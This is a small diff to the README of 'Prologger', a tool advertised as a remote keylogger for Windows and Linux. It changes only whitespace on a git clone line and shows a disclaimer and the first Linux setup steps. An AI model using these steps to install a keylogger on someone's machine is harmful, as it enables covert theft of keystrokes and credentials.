@@ -12,7 +12,7 @@ Advanced remote keylogger for windows and linux tested on both ( win/linux 32,64
 Usage of Prologger(keylogger) for attacking targets without prior mutual consent is illegal. It's the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program.Use it for educational purpose only.
 
 # Usage (Linux):
- git clone https://github.com/promax-cmd/Prologger.git 
+ git clone https://github.com/promax-cmd/Prologger.git
  
  cd Prologger
  
